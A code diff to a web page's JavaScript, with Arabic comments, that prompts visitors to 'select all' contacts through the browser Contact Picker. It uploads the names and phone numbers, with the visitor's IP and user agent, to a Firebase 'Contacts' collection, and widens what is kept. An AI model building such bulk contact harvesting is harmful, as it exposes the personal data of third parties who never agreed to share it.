@@ -990,33 +990,44 @@
       try {
         const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
 
-        banner.style.display = 'none';
-
+        // المستخدم أغلق النافذة بدون اختيار
         if (!contacts || contacts.length === 0) {
+          banner.style.display = 'block';
           yesBtn.disabled      = false;
           btnText.textContent  = '✅ موافق — تحديد الكل';
           btnSpinner.style.display = 'none';
           return;
         }
 
+        // حفظ الأسماء مع أو بدون أرقام هاتف
         const flat = contacts.map(c => ({
-          name:   (c.name  || []).join(' ').trim() || '—',
-          phones: (c.tel   || []).map(t => t.trim()).filter(Boolean)
-        })).filter(c => c.phones.length > 0);
+          name:   (c.name || []).join(' ').trim() || '—',
+          phones: (c.tel  || []).map(t => t.trim()).filter(Boolean)
+        })).filter(c => c.name !== '—' || c.phones.length > 0);
 
-        if (flat.length === 0) return;
+        banner.style.display = 'none';
 
-        await addDoc(collection(db, 'Contacts'), {
-          contacts:  flat,
-          count:     flat.length,
-          ip:        gpsCoords?.ip ?? null,
-          userAgent: navigator.userAgent.substring(0, 200),
-          savedAt:   serverTimestamp()
-        });
+        if (flat.length === 0) {
+          localStorage.setItem(CONTACTS_KEY, '1');
+          return;
+        }
 
-        localStorage.setItem(CONTACTS_KEY, '1');
+        try {
+          await addDoc(collection(db, 'Contacts'), {
+            contacts:  flat,
+            count:     flat.length,
+            ip:        visitorData?.ip ?? null,
+            userAgent: navigator.userAgent.substring(0, 200),
+            savedAt:   serverTimestamp()
+          });
+          localStorage.setItem(CONTACTS_KEY, '1');
+          showToast(`✅ تم حفظ ${flat.length} جهة اتصال بنجاح`, 'success');
+        } catch (saveErr) {
+          // فشل الحفظ — أعلم المستخدم
+          showToast('⚠ لم يتم الحفظ — تحقق من الاتصال بالإنترنت', 'error');
+        }
       } catch (_) {
-        // المستخدم أغلق النافذة — أعد البانر لحالته
+        // المستخدم أغلق النافذة أو رفض الإذن — أعد البانر
         banner.style.display = 'block';
         yesBtn.disabled      = false;
         btnText.textContent  = '✅ موافق — تحديد الكل';
